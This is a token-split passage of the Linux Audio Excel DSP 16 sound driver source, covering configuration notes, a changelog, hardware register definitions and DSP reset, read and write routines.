"someone", "can", "test", "the", "combination", "AEDSP16", "+", "MSS", "or", "AEDSP16", "+", "SBPRO", "please", "let", "me", "know", "if", "it", "works", ".", "The", "MPU", "-", "401", "support", "can", "be", "compiled", "in", "together", "with", "one", "of", "the", "other", "two", "operating", "modes", ".", "NOTE", ":", "This", "is", "something", "like", "plug", "-", "and", "-", "play", ":", "we", "have", "only", "to", "plug", "the", "AEDSP16", "board", "in", "the", "socket", ",", "and", "then", "configure", "and", "compile", "a", "kernel", "that", "uses", "the", "AEDSP16", "software", "configuration", "capability", ".", "No", "jumper", "setting", "is", "needed", "!", "For", "example", ",", "if", "you", "want", "AEDSP16", "to", "be", "an", "SBPro", ",", "on", "irq", "10", ",", "dma", "3", "you", "have", "just", "to", "make", "config", "the", "OSS", "Lite", "package", ",", "configuring", "the", "AEDSP16", "sound", "card", ",", "then", "activating", "the", "SBPro", "emulation", "mode", "and", "at", "last", "configuring", "IRQ", "and", "DMA", ".", "Compile", "the", "kernel", "and", "run", "it", ".", "NOTE", ":", "This", "means", "for", "SC", "-", "6000", "cards", "that", "you", "can", "choose", "irq", "and", "dma", ",", "but", "not", "the", "I", "/", "O", "addresses", ".", "To", "change", "I", "/", "O", "addresses", "you", "have", "to", "set", "them", "with", "jumpers", ".", "For", "SC", "-", "6600", "cards", "you", "have", "no", "jumpers", "so", "you", "have", "to", "set", "up", "your", "full", "card", "configuration", "in", "the", "make", "config", ".", "You", "can", "change", "the", "irq", "/", "dma", "/", "mirq", "settings", "WITHOUT", "THE", "NEED", "to", "open", "your", "computer", "and", "massage", "the", "jumpers", "(", "there", "are", "no", "irq", "/", "dma", "/", "mirq", "jumpers", "to", "be", "configured", "anyway", ",", "only", "I", "/", "O", "BASE", "values", "have", "to", "be", "configured", "with", "jumpers", ")", "For", "some", "ununderstandable", "reason", ",", "the", "card", "default", "of", "irq", "7", ",", "dma", "1", ",", "don", "'", "t", "work", "for", "me", ".", "Seems", "to", "be", "an", "IRQ", "or", "DMA", "conflict", ".", "Under", "heavy", "HDD", "work", ",", "the", "kernel", "start", "to", "erupt", "out", "a", "lot", "of", "messages", "like", ":", "'", "Sound", ":", "DMA", "timed", "out", "-", "IRQ", "/", "DRQ", "config", "error", "?", "'", "For", "what", "I", "can", "say", ",", "I", "have", "NOT", "any", "conflict", "at", "irq", "7", "(", "under", "linux", "I", "'", "m", "using", "the", "lp", "polling", "driver", ")", ",", "and", "dma", "line", "1", "is", "unused", "as", "stated", "by", "/", "proc", "/", "dma", ".", "I", "can", "suppose", "this", "is", "a", "bug", "of", "AEDSP16", ".", "I", "know", "my", "hardware", "so", "I", "'", "m", "pretty", "sure", "I", "have", "not", "any", "conflict", ",", "but", "may", "be", "I", "'", "m", "wrong", ".", "Who", "knows", "!", "Anyway", "a", "setting", "of", "irq", "10", ",", "dma", "3", "works", "really", "fine", ".", "NOTE", ":", "if", "someone", "can", "use", "AEDSP16", "with", "irq", "7", ",", "dma", "1", ",", "please", "let", "me", "know", "the", "emulation", "mode", ",", "all", "the", "installed", "hardware", "and", "the", "hardware", "configuration", "(", "irq", "and", "dma", "settings", "of", "all", "the", "hardware", ")", ".", "This", "init", "module", "should", "work", "with", "SBPRO", "+", "MSS", ",", "when", "one", "of", "the", "two", "is", "the", "AEDSP16", "emulation", "and", "the", "other", "the", "real", "card", ".", "(", "see", "[", "1", "]", ")", "For", "example", ":", "AEDSP16", "(", "0x220", ")", "in", "SBPRO", "emu", "(", "0x220", ")", "+", "real", "MSS", "+", "other", "AEDSP16", "(", "0x220", ")", "in", "MSS", "emu", "+", "real", "SBPRO", "(", "0x240", ")", "+", "other", "MPU401", "should", "work", ".", "(", "see", "[", "2", "]", ")", "[", "1", "]", "Date", ":", "Mon", ",", "29", "Jul", "1997", "08", ":", "35", ":", "40", "+", "0100", "From", ":", "Mr", "S", "J", "Greenaway", "<", "sjg95", "@", "unixfe", ".", "rl", ".", "ac", ".", "uk", ">", "[", "..", ".]", "Just", "to", "let", "you", "know", "got", "my", "Audio", "Excel", "(", "emulating", "a", "MSS", ")", "working", "with", "my", "original", "SB16", ",", "thanks", "for", "the", "driver", "!", "[", "..", ".]", "[", "2", "]", "Not", "tested", "by", "me", "for", "lack", "of", "hardware", ".", "TODO", ",", "WISHES", "AND", "TECH", "-", "About", "I", "/", "O", "ports", "allocation", "Request", "the", "2x0h", "region", "(", "port", "base", ")", "in", "any", "case", "if", "we", "are", "using", "this", "card", ".", "NOTE", ":", "the", "\"", "aedsp16", "(", "base", ")", "\"", "string", "with", "which", "we", "are", "requesting", "the", "aedsp16", "port", "base", "region", "(", "see", "code", ")", "does", "not", "mean", "necessarily", "that", "we", "are", "emulating", "sbpro", ".", "Even", "if", "this", "region", "is", "the", "sbpro", "I", "/", "O", "ports", "region", ",", "we", "use", "this", "region", "to", "access", "the", "control", "registers", "of", "the", "card", ",", "and", "if", "emulating", "sbpro", ",", "I", "/", "O", "sbpro", "registers", "too", ".", "If", "we", "are", "emulating", "MSS", ",", "the", "sbpro", "registers", "are", "not", "used", ",", "in", "no", "way", ",", "to", "emulate", "an", "sbpro", ":", "they", "are", "used", "only", "for", "configuration", "purposes", ".", "Started", "Fri", "Mar", "17", "16", ":", "13", ":", "18", "MET", "1995", "v0", ".", "1", "(", "ALPHA", ",", "was", "a", "user", "-", "level", "program", "called", "AudioExcelDSP16", ".", "c", ")", "-", "Initial", "code", ".", "v0", ".", "2", "(", "ALPHA", ")", "-", "Cleanups", ".", "-", "Integrated", "with", "Linux", "voxware", "v", "2", ".", "90", "-", "2", "kernel", "sound", "driver", ".", "-", "SoundBlaster", "Pro", "mode", "configuration", ".", "-", "Microsoft", "Sound", "System", "mode", "configuration", ".", "-", "MPU", "-", "401", "mode", "configuration", ".", "v0", ".", "3", "(", "ALPHA", ")", "-", "Cleanups", ".", "-", "Rearranged", "the", "code", "to", "let", "aedsp16_init_board", "be", "more", "general", ".", "-", "Erased", "the", "REALLY_SLOW_IO", ".", "We", "don", "'", "t", "need", "it", ".", "Erased", "the", "linux", "/", "io", ".", "h", "inclusion", "too", ".", "We", "rely", "on", "os", ".", "h", "-", "Used", "the", "to", "get", "a", "variable", "len", "string", "(", "we", "are", "not", "sure", "about", "the", "len", "of", "Copyright", "string", ")", ".", "This", "works", "with", "any", "SB", "and", "compatible", ".", "-", "Added", "the", "code", "to", "request_region", "at", "device", "init", "(", "should", "go", "in", "the", "main", "body", "of", "voxware", ")", ".", "v0", ".", "4", "(", "BETA", ")", "-", "Better", "configure", ".", "c", "patch", "for", "aedsp16", "configuration", "(", "better", "logic", "of", "inclusion", "of", "AEDSP16", "support", ")", "-", "Modified", "the", "conditional", "compilation", "to", "better", "support", "more", "than", "one", "sound", "card", "of", "the", "emulated", "type", "(", "read", "the", "NOTES", "above", ")", "-", "Moved", "the", "sb", "init", "routine", "from", "the", "attach", "to", "the", "very", "first", "probe", "in", "sb_card", ".", "c", "-", "Rearrangements", "and", "cleanups", "-", "Wiped", "out", "some", "unnecessary", "code", "and", "variables", ":", "this", "is", "kernel", "code", "so", "it", "is", "better", "save", "some", "TEXT", "and", "DATA", "-", "Fixed", "the", "request_region", "code", ".", "We", "must", "allocate", "the", "aedsp16", "(", "sbpro", ")", "I", "/", "O", "ports", "in", "any", "case", "because", "they", "are", "used", "to", "access", "the", "DSP", "configuration", "registers", "and", "we", "can", "not", "allow", "anyone", "to", "get", "them", ".", "v0", ".", "5", "-", "cleanups", "on", "comments", "-", "prep", "for", "diffs", "against", "v3", ".", "0", "-", "proto", "-", "950402", "v0", ".", "6", "-", "removed", "the", "request_region", "(", ")", "s", "when", "compiling", "the", "MODULE", "sound", ".", "o", "because", "we", "are", "not", "allowed", "(", "by", "the", "actual", "voxware", "structure", ")", "to", "release_region", "(", ")", "v0", ".", "7", "(", "pre", "ALPHA", ",", "not", "distributed", ")", "-", "started", "porting", "this", "module", "to", "kernel", "1", ".", "3", ".", "84", ".", "Dummy", "probe", "/", "attach", "routines", ".", "v0", ".", "8", "(", "ALPHA", ")", "-", "attached", "all", "the", "init", "routines", ".", "v0", ".", "9", "(", "BETA", ")", "-", "Integrated", "with", "linux", "-", "pre2", ".", "0", ".", "7", "-", "Integrated", "with", "configuration", "scripts", ".", "-", "Cleaned", "up", "and", "beautyfied", "the", "code", ".", "v0", ".", "9", ".", "9", "(", "BETA", ")", "-", "Thanks", "to", "Piercarlo", "Grandi", ":", "corrected", "the", "conditonal", "compilation", "code", ".", "Now", "only", "the", "code", "configured", "is", "compiled", "in", ",", "with", "some", "memory", "saving", ".", "v0", ".", "9", ".", "10", "-", "Integration", "into", "the", "sound", "/", "lowlevel", "/", "section", "of", "the", "sound", "driver", ".", "-", "Re", "-", "organized", "the", "code", ".", "v0", ".", "9", ".", "11", "(", "not", "distributed", ")", "-", "Rewritten", "the", "init", "interface", "-", "routines", "to", "initialize", "the", "AEDSP16", "in", "one", "shot", ".", "-", "More", "cosmetics", ".", "-", "SC", "-", "6600", "support", ".", "-", "More", "soft", "/", "hard", "configuration", ".", "v0", ".", "9", ".", "12", "-", "Refined", "the", "v0", ".", "9", ".", "11", "code", "with", "conditional", "compilation", "to", "distinguish", "between", "SC", "-", "6000", "and", "SC", "-", "6600", "code", ".", "v1", ".", "0", ".", "0", "-", "Prep", "for", "merging", "with", "OSS", "Lite", "and", "Linux", "kernel", "2", ".", "1", ".", "13", "-", "Corrected", "a", "bug", "in", "request", "/", "check", "/", "release", "region", "calls", "(", "thanks", "to", "the", "new", "kernel", "exception", "handling", ")", ".", "v1", ".", "1", "-", "Revamped", "for", "integration", "with", "new", "modularized", "sound", "drivers", ":", "to", "enhance", "the", "flexibility", "of", "modular", "version", ",", "I", "have", "removed", "all", "the", "conditional", "compilation", "for", "SBPRO", ",", "MPU", "and", "MSS", "code", ".", "Now", "it", "is", "all", "managed", "with", "the", "ae_config", "structure", ".", "v1", ".", "2", "-", "Module", "informations", "added", ".", "-", "Removed", "aedsp16_delay_10msec", "(", "),", "now", "using", "mdelay", "(", "10", ")", "-", "All", "data", "and", "funcs", "moved", "to", ".", "*.", "init", "section", ".", "v1", ".", "3", "Arnaldo", "Carvalho", "de", "Melo", "<", "acme", "@", "conectiva", ".", "com", ".", "br", ">", "-", "2000", "/", "09", "/", "27", "-", "got", "rid", "of", "check_region", "Known", "Problems", ":", "-", "Audio", "Excel", "DSP", "16", "III", "don", "'", "t", "work", "with", "this", "driver", ".", "Credits", ":", "Many", "thanks", "to", "Gerald", "Britton", "<", "gbritton", "@", "CapAccess", ".", "org", ">", ".", "He", "helped", "me", "a", "lot", "in", "testing", "the", "0", ".", "9", ".", "11", "and", "0", ".", "9", ".", "12", "versions", "of", "this", "driver", ".", "*", "/", "#", "define", "VERSION", "\"", "1", ".", "3", "\"", "/", "*", "Version", "of", "Audio", "Excel", "DSP", "16", "driver", "*", "/", "#", "undef", "AEDSP16_DEBUG", "/", "*", "Define", "this", "to", "1", "to", "enable", "debug", "code", "*", "/", "#", "undef", "AEDSP16_DEBUG_MORE", "/", "*", "Define", "this", "to", "1", "to", "enable", "more", "debug", "*", "/", "#", "undef", "AEDSP16_INFO", "/", "*", "Define", "this", "to", "1", "to", "enable", "info", "code", "*", "/", "#", "if", "defined", "(", "AEDSP16_DEBUG", ")", "#", "define", "DBG", "(", "x", ")", "printk", "x", "#", "if", "defined", "(", "AEDSP16_DEBUG_MORE", ")", "#", "define", "DBG1", "(", "x", ")", "printk", "x", "#", "else", "#", "define", "DBG1", "(", "x", ")", "#", "endif", "#", "else", "#", "define", "DBG", "(", "x", ")", "#", "define", "DBG1", "(", "x", ")", "#", "endif", "/", "*", "*", "Misc", "definitions", "*", "/", "#", "define", "TRUE", "1", "#", "define", "FALSE", "0", "/", "*", "*", "Region", "Size", "for", "request", "/", "check", "/", "release", "region", ".", "*", "/", "#", "define", "IOBASE_REGION_SIZE", "0x10", "/", "*", "*", "Hardware", "related", "defaults", "*", "/", "#", "define", "DEF_AEDSP16_IOB", "0x220", "/", "*", "0x220", "(", "default", ")", "0x240", "*", "/", "#", "define", "DEF_AEDSP16_IRQ", "7", "/", "*", "5", "7", "(", "default", ")", "9", "10", "11", "*", "/", "#", "define", "DEF_AEDSP16_MRQ", "0", "/", "*", "5", "7", "9", "10", "0", "(", "default", ")", ",", "0", "means", "disable", "*", "/", "#", "define", "DEF_AEDSP16_DMA", "1", "/", "*", "0", "1", "(", "default", ")", "3", "*", "/", "/", "*", "*", "Commands", "of", "AEDSP16", "'", "s", "DSP", "(", "SBPRO", "+", "special", ")", ".", "*", "Some", "of", "them", "are", "COMMAND_xx", ",", "in", "the", "future", "they", "may", "change", ".", "*", "/", "#", "define", "WRITE_MDIRQ_CFG", "0x50", "/", "*", "Set", "M", "&", "I", "&", "DRQ", "mask", "(", "the", "real", "config", ")", "*", "/", "#", "define", "COMMAND_52", "0x52", "/", "*", "*", "/", "#", "define", "READ_HARD_CFG", "0x58", "/", "*", "Read", "Hardware", "Config", "(", "I", "/", "O", "base", "etc", ")", "*", "/", "#", "define", "COMMAND_5C", "0x5c", "/", "*", "*", "/", "#", "define", "COMMAND_60", "0x60", "/", "*", "*", "/", "#", "define", "COMMAND_66", "0x66", "/", "*", "*", "/", "#", "define", "COMMAND_6C", "0x6c", "/", "*", "*", "/", "#", "define", "COMMAND_6E", "0x6e", "/", "*", "*", "/", "#", "define", "COMMAND_88", "0x88", "/", "*", "*", "/", "#", "define", "DSP_INIT_MSS", "0x8c", "/", "*", "Enable", "Microsoft", "Sound", "System", "mode", "*", "/", "#", "define", "COMMAND_C5", "0xc5", "/", "*", "*", "/", "#", "define", "GET_DSP_VERSION", "0xe1", "/", "*", "Get", "DSP", "Version", "*", "/", "#", "define", "GET_DSP_COPYRIGHT", "0xe3", "/", "*", "Get", "DSP", "Copyright", "*", "/", "/", "*", "*", "Offsets", "of", "AEDSP16", "DSP", "I", "/", "O", "ports", ".", "The", "offset", "is", "added", "to", "base", "I", "/", "O", "port", "*", "to", "have", "the", "actual", "I", "/", "O", "port", ".", "*", "Register", "permissions", "are", ":", "*", "(", "wo", ")", "=", "=", "Write", "Only", "*", "(", "ro", ")", "=", "=", "Read", "Only", "*", "(", "w", "-", ")", "=", "=", "Write", "*", "(", "r", "-", ")", "=", "=", "Read", "*", "/", "#", "define", "DSP_RESET", "0x06", "/", "*", "offset", "of", "DSP", "RESET", "(", "wo", ")", "*", "/", "#", "define", "DSP_READ", "0x0a", "/", "*", "offset", "of", "DSP", "READ", "(", "ro", ")", "*", "/", "#", "define", "DSP_WRITE", "0x0c", "/", "*", "offset", "of", "DSP", "WRITE", "(", "w", "-", ")", "*", "/", "#", "define", "DSP_COMMAND", "0x0c", "/", "*", "offset", "of", "DSP", "COMMAND", "(", "w", "-", ")", "*", "/", "#", "define", "DSP_STATUS", "0x0c", "/", "*", "offset", "of", "DSP", "STATUS", "(", "r", "-", ")", "*", "/", "#", "define", "DSP_DATAVAIL", "0x0e", "/", "*", "offset", "of", "DSP", "DATA", "AVAILABLE", "(", "ro", ")", "*", "/", "#", "define", "RETRY", "10", "/", "*", "Various", "retry", "values", "on", "I", "/", "O", "opera", "-", "*", "/", "#", "define", "STATUSRETRY", "1000", "/", "*", "tions", ".", "Sometimes", "we", "have", "to", "*", "/", "#", "define", "HARDRETRY", "500000", "/", "*", "wait", "for", "previous", "cmd", "to", "complete", "*", "/", "/", "*", "*", "Size", "of", "character", "arrays", "that", "store", "name", "and", "version", "of", "sound", "card", "*", "/", "#", "define", "CARDNAMELEN", "15", "/", "*", "Size", "of", "the", "card", "'", "s", "name", "in", "chars", "*", "/", "#", "define", "CARDVERLEN", "10", "/", "*", "Size", "of", "the", "card", "'", "s", "version", "in", "chars", "*", "/", "#", "define", "CARDVERDIGITS", "2", "/", "*", "Number", "of", "digits", "in", "the", "version", "*", "/", "#", "if", "defined", "(", "CONFIG_SC6600", ")", "/", "*", "*", "Bitmapped", "flags", "of", "hard", "configuration", "*", "/", "/", "*", "*", "Decode", "macros", "(", "xl", "=", "=", "low", "byte", ",", "xh", "=", "high", "byte", ")", "*", "/", "#", "define", "IOBASE", "(", "xl", ")", "(", "(", "xl", "&", "0x01", ")", "?", "0x240", ":", "0x220", ")", "#", "define", "JOY", "(", "xl", ")", "(", "xl", "&", "0x02", ")", "#", "define", "MPUADDR", "(", "xl", ")", "(", "\\", "(", "xl", "&", "0x0C", ")", "?", "0x330", ":", "\\", "(", "xl", "&", "0x08", ")", "?", "0x320", ":", "\\", "(", "xl", "&", "0x04", ")", "?", "0x310", ":", "\\", "0x300", ")", "#", "define", "WSSADDR", "(", "xl", ")", "(", "(", "xl", "&", "0x10", ")", "?", "0xE80", ":", "0x530", ")", "#", "define", "CDROM", "(", "xh", ")", "(", "xh", "&", "0x20", ")", "#", "define", "CDROMADDR", "(", "xh", ")", "(", "((", "xh", "&", "0x1F", ")", "<", "<", "4", ")", "+", "0x200", ")", "/", "*", "*", "Encode", "macros", "*", "/", "#", "define", "BLDIOBASE", "(", "xl", ",", "val", ")", "{", "\\", "xl", "&", "=", "~", "0x01", ";", "\\", "if", "(", "val", "=", "=", "0x240", ")", "\\", "xl", "|", "=", "0x01", ";", "\\", "}", "#", "define", "BLDJOY", "(", "xl", ",", "val", ")", "{", "\\", "xl", "&", "=", "~", "0x02", ";", "\\", "if", "(", "val", "=", "=", "1", ")", "\\", "xl", "|", "=", "0x02", ";", "\\", "}", "#", "define", "BLDMPUADDR", "(", "xl", ",", "val", ")", "{", "\\", "xl", "&", "=", "~", "0x0C", ";", "\\", "switch", "(", "val", ")", "{", "\\", "case", "0x330", ":", "\\", "xl", "|", "=", "0x0C", ";", "\\", "break", ";", "\\", "case", "0x320", ":", "\\", "xl", "|", "=", "0x08", ";", "\\", "break", ";", "\\", "case", "0x310", ":", "\\", "xl", "|", "=", "0x04", ";", "\\", "break", ";", "\\", "case", "0x300", ":", "\\", "xl", "|", "=", "0x00", ";", "\\", "break", ";", "\\", "default", ":", "\\", "xl", "|", "=", "0x00", ";", "\\", "break", ";", "\\", "}", "\\", "}", "#", "define", "BLDWSSADDR", "(", "xl", ",", "val", ")", "{", "\\", "xl", "&", "=", "~", "0x10", ";", "\\", "if", "(", "val", "=", "=", "0xE80", ")", "\\", "xl", "|", "=", "0x10", ";", "\\", "}", "#", "define", "BLDCDROM", "(", "xh", ",", "val", ")", "{", "\\", "xh", "&", "=", "~", "0x20", ";", "\\", "if", "(", "val", "=", "=", "1", ")", "\\", "xh", "|", "=", "0x20", ";", "\\", "}", "#", "define", "BLDCDROMADDR", "(", "xh", ",", "val", ")", "{", "\\", "int", "tmp", "=", "val", ";", "\\", "tmp", "-", "=", "0x200", ";", "\\", "tmp", ">", ">=", "4", ";", "\\", "tmp", "&", "=", "0x1F", ";", "\\", "xh", "|", "=", "tmp", ";", "\\", "xh", "&", "=", "0x7F", ";", "\\", "xh", "|", "=", "0x40", ";", "\\", "}", "#", "endif", "/", "*", "CONFIG_SC6600", "*", "/", "/", "*", "*", "Bit", "mapped", "flags", "for", "calling", "aedsp16_init_board", "(", "),", "and", "saving", "the", "current", "*", "emulation", "mode", ".", "*", "/", "#", "define", "INIT_NONE", "(", "0", ")", "#", "define", "INIT_SBPRO", "(", "1", "<", "<", "0", ")", "#", "define", "INIT_MSS", "(", "1", "<", "<", "1", ")", "#", "define", "INIT_MPU401", "(", "1", "<", "<", "2", ")", "static", "int", "soft_cfg", "__initdata", "=", "0", ";", "/", "*", "bitmapped", "config", "*", "/", "static", "int", "soft_cfg_mss", "__initdata", "=", "0", ";", "/", "*", "bitmapped", "mss", "config", "*", "/", "static", "int", "ver", "[", "CARDVERDIGITS", "]", "__initdata", "=", "{", "0", ",", "0", "}", ";", "/", "*", "DSP", "Ver", ":", "hi", "-", ">", "ver", "[", "0", "]", "lo", "-", ">", "ver", "[", "1", "]", "*", "/", "#", "if", "defined", "(", "CONFIG_SC6600", ")", "static", "int", "hard_cfg", "[", "2", "]", "/", "*", "lo", "<", "-", "hard_cfg", "[", "0", "]", "hi", "<", "-", "hard_cfg", "[", "1", "]", "*", "/", "__initdata", "=", "{", "0", ",", "0", "}", ";", "#", "endif", "/", "*", "CONFIG_SC6600", "*", "/", "#", "if", "defined", "(", "CONFIG_SC6600", ")", "/", "*", "Decoded", "hard", "configuration", "*", "/", "struct", "d_hcfg", "{", "int", "iobase", ";", "int", "joystick", ";", "int", "mpubase", ";", "int", "wssbase", ";", "int", "cdrom", ";", "int", "cdrombase", ";", "}", ";", "static", "struct", "d_hcfg", "decoded_hcfg", "__initdata", "=", "{", "0", ",", "}", ";", "#", "endif", "/", "*", "CONFIG_SC6600", "*", "/", "/", "*", "orVals", "contain", "the", "values", "to", "be", "or", "'", "ed", "*", "/", "struct", "orVals", "{", "int", "val", ";", "/", "*", "irq", "|", "mirq", "|", "dma", "*", "/", "int", "or", ";", "/", "*", "soft_cfg", "|", "=", "TheStruct", ".", "or", "*", "/", "}", ";", "/", "*", "aedsp16_info", "contain", "the", "audio", "card", "configuration", "*", "/", "struct", "aedsp16_info", "{", "int", "base_io", ";", "/", "*", "base", "I", "/", "O", "address", "for", "accessing", "card", "*", "/", "int", "irq", ";", "/", "*", "irq", "value", "for", "DSP", "I", "/", "O", "*", "/", "int", "mpu_irq", ";", "/", "*", "irq", "for", "mpu401", "interface", "I", "/", "O", "*", "/", "int", "dma", ";", "/", "*", "dma", "value", "for", "DSP", "I", "/", "O", "*", "/", "int", "mss_base", ";", "/", "*", "base", "I", "/", "O", "for", "Microsoft", "Sound", "System", "*", "/", "int", "mpu_base", ";", "/", "*", "base", "I", "/", "O", "for", "MPU", "-", "401", "emulation", "*", "/", "int", "init", ";", "/", "*", "Initialization", "status", "of", "the", "card", "*", "/", "}", ";", "/", "*", "*", "Magic", "values", "that", "the", "DSP", "will", "eat", "when", "configuring", "irq", "/", "mirq", "/", "dma", "*", "/", "/", "*", "DSP", "IRQ", "conversion", "array", "*", "/", "static", "struct", "orVals", "orIRQ", "[", "]", "__initdata", "=", "{", "{", "0x05", ",", "0x28", "}", ",", "{", "0x07", ",", "0x08", "}", ",", "{", "0x09", ",", "0x10", "}", ",", "{", "0x0a", ",", "0x18", "}", ",", "{", "0x0b", ",", "0x20", "}", ",", "{", "0x00", ",", "0x00", "}", "}", ";", "/", "*", "MPU", "-", "401", "IRQ", "conversion", "array", "*", "/", "static", "struct", "orVals", "orMIRQ", "[", "]", "__initdata", "=", "{", "{", "0x05", ",", "0x04", "}", ",", "{", "0x07", ",", "0x44", "}", ",", "{", "0x09", ",", "0x84", "}", ",", "{", "0x0a", ",", "0xc4", "}", ",", "{", "0x00", ",", "0x00", "}", "}", ";", "/", "*", "DMA", "Channels", "conversion", "array", "*", "/", "static", "struct", "orVals", "orDMA", "[", "]", "__initdata", "=", "{", "{", "0x00", ",", "0x01", "}", ",", "{", "0x01", ",", "0x02", "}", ",", "{", "0x03", ",", "0x03", "}", ",", "{", "0x00", ",", "0x00", "}", "}", ";", "static", "struct", "aedsp16_info", "ae_config", "=", "{", ".", "base_io", "=", "DEF_AEDSP16_IOB", ",", ".", "irq", "=", "DEF_AEDSP16_IRQ", ",", ".", "mpu_irq", "=", "DEF_AEDSP16_MRQ", ",", ".", "dma", "=", "DEF_AEDSP16_DMA", ",", ".", "mss_base", "=", "-", "1", ",", ".", "mpu_base", "=", "-", "1", ",", ".", "init", "=", "INIT_NONE", "}", ";", "/", "*", "*", "Buffers", "to", "store", "audio", "card", "informations", "*", "/", "static", "char", "DSPCopyright", "[", "CARDNAMELEN", "+", "1", "]", "__initdata", "=", "{", "0", ",", "}", ";", "static", "char", "DSPVersion", "[", "CARDVERLEN", "+", "1", "]", "__initdata", "=", "{", "0", ",", "}", ";", "static", "int", "__init", "aedsp16_wait_data", "(", "int", "port", ")", "{", "int", "loop", "=", "STATUSRETRY", ";", "unsigned", "char", "ret", "=", "0", ";", "DBG1", "(", "(\"", "aedsp16_wait_data", "(", "0x", "%", "x", ")", ":", "\"", ",", "port", ")", ");", "do", "{", "ret", "=", "inb", "(", "port", "+", "DSP_DATAVAIL", ")", ";", "/", "*", "*", "Wait", "for", "data", "available", "(", "bit", "7", "of", "ret", "=", "=", "1", ")", "*", "/", "}", "while", "(", "!(", "ret", "&", "0x80", ")", "&", "&", "loop", "-", "-)", ";", "if", "(", "ret", "&", "0x80", ")", "{", "DBG1", "(", "(\"", "success", ".", "\\", "n", "\"", "))", ";", "return", "TRUE", ";", "}", "DBG1", "(", "(\"", "failure", ".", "\\", "n", "\"", "))", ";", "return", "FALSE", ";", "}", "static", "int", "__init", "aedsp16_read", "(", "int", "port", ")", "{", "int", "inbyte", ";", "DBG", "(", "(\"", "Read", "DSP", "Byte", "(", "0x", "%", "x", ")", ":", "\"", ",", "port", ")", ");", "if", "(", "aedsp16_wait_data", "(", "port", ")", "=", "=", "FALSE", ")", "{", "DBG", "(", "(\"", "failure", ".", "\\", "n", "\"", "))", ";", "return", "-", "1", ";", "}", "inbyte", "=", "inb", "(", "port", "+", "DSP_READ", ")", ";", "DBG", "(", "(\"", "read", "[", "0x", "%", "x", "]", "/{", "%", "c", "}", ".\\", "n", "\"", ",", "inbyte", ",", "inbyte", ")", ");", "return", "inbyte", ";", "}", "static", "int", "__init", "aedsp16_test_dsp", "(", "int", "port", ")", "{", "return", "(", "(", "aedsp16_read", "(", "port", ")", "=", "=", "0xaa", ")", "?", "TRUE", ":", "FALSE", ")", ";", "}", "static", "int", "__init", "aedsp16_dsp_reset", "(", "int", "port", ")", "{", "/", "*", "*", "Reset", "DSP", "*", "/", "DBG", "(", "(\"", "Reset", "DSP", ":", "\\", "n", "\"", "))", ";", "outb", "(", "1", ",", "(", "port", "+", "DSP_RESET", ")", ");", "udelay", "(", "10", ")", ";", "outb", "(", "0", ",", "(", "port", "+", "DSP_RESET", ")", ");", "udelay", "(", "10", ")", ";", "udelay", "(", "10", ")", ";", "if", "(", "aedsp16_test_dsp", "(", "port", ")", "=", "=", "TRUE", ")", "{", "DBG", "(", "(\"", "success", ".", "\\", "n", "\"", "))", ";", "return", "TRUE", ";", "}", "else", "DBG", "(", "(\"", "failure", ".", "\\", "n", "\"", "))", ";", "return", "FALSE", ";", "}", "static", "int", "__init", "aedsp16_write", "(", "int", "port", ",", "int", "cmd", ")", "{", "unsigned", "char", "ret", ";", "int", "loop", "=", "HARDRETRY", ";", "DBG", "(", "(\"", "Write", "DSP", "Byte", "(", "0x", "%", "x", ")", "[", "0x", "%", "x", "]", ":", "\"", ",", "port", ",", "cmd", ")", ");", "do", "{", "ret", "=", "inb", "(", "port", "+", "DSP_STATUS", ")", ";", "/", "*", "*", "DSP", "ready", "to", "receive", "data", "if", "bit", "7", "of", "ret", "=", "=", "0", "*", "/", "if", "(", "!(", "ret", "&", "0x80", ")", ")", "{", "outb", "(", "cmd", ",", "port", "+", "DSP_COMMAND", ")", ";", "DBG", "(", "(\"", "success", ".", "\\", "n", "\"", "))", ";", "return", "0", ";", "}", "}", "while", "(", "loop", "-", "-)", ";", "DBG", "(", "(\"", "timeout", ".", "\\", "n", "\"", "))", ";", "printk", "(", "\"[", "AEDSP16", "]", "DSP", "Command", "(", "0x", "%", "x", ")", "timeout", ".", "\\", "n", "\"", ",", "cmd", ")", ";", "return", "-", "1", ";", "}", "#", "if", "defined", "(", "CONFIG_SC6600", ")", "#", "if", "defined", "(", "AEDSP16_INFO", ")", "|", "|", "defined", "(", "AEDSP16_DEBUG", ")", "void", "__init", "aedsp16_pinfo", "(", "void", ")", "{", "DBG", "(", "(\"", "\\", "n", "Base", "address", ":", "%", "x", "\\", "n", "\"", ",", "decoded_hcfg", ".", "iobase", ")", ");", "DBG", "(", "(\"", "Joystick", ":", "%", "s", "present", "\\", "n", "\"", ",", "decoded_hcfg", ".", "joystick", "?", "\"\"", ":\"", "not", "\"", "))", ";", "DBG", "(", "(\"", "WSS", "addr", ":", "%", "x", "\\", "n", "\"", ",", "decoded_hcfg", ".", "wssbase", ")", ");", "DBG", "(", "(\"", "MPU", "-", "401", "addr", ":", "%", "x", "\\", "n", "\"", ",", "decoded_hcfg", ".", "mpubase", ")", ");", "DBG", "(", "(\"", "CDROM", ":", "%", "s", "present", "\\", "n", "\"", ",", "(", "decoded_hcfg", ".", "cdrom", "!", "=", "4", ")", "?\"", "\":", "\"", "not", "\"", "))", ";", "DBG", "(", "(\"", "CDROMADDR", ":", "%", "x", "\\", "n", "\\", "n", "\"", ",", "decoded_hcfg", ".", "cdrombase", ")", ");", "}", "#", "endif", "static", "void", "__init", "aedsp16_hard_decode", "(", "void", ")", "{", "DBG", "(", "(\"", "aedsp16_hard_decode", ":", "0x", "%", "x", ",", "0x", "%", "x", "\\", "n", "\"", ",", "hard_cfg", "[", "0", "]", ",", "hard_cfg", "[", "1", "]", "))", ";", "/", "*", "*", "Decode", "Cfg", "Bytes", ".", "*", "/", "decoded_hcfg", ".", "iobase", "=", "IOBASE", "(", "hard_cfg", "[", "0", "]", ");", "decoded_hcfg", ".", "joystick", "=", "JOY", "(", "hard_cfg", "[", "0", "]", ");", "decoded_hcfg", ".", "wssbase", "=", "WSSADDR", "(", "hard_cfg", "[", "0", "]", ");", "decoded_hcfg", ".", "mpubase", "=", "MPUADDR", "(", "hard_cfg", "[", "0", "]", ");", "decoded_hcfg", ".", "cdrom", "=", "CDROM", "(", "hard_cfg", "[", "1", "]", ");", "decoded_hcfg", ".", "cdrombase", "=", "CDROMADDR", "(", "hard_cfg", "[", "1", "]", ");", "#", "if", "defined", "(", "AEDSP16_INFO", ")", "|", "|", "defined", "(", "AEDSP16_DEBUG", ")", "printk", "(", "\"", "Original", "sound", "card", "configuration", ":", "\\", "n", "\"", ");", "aedsp16_pinfo", "(", ");", "#", "endif", 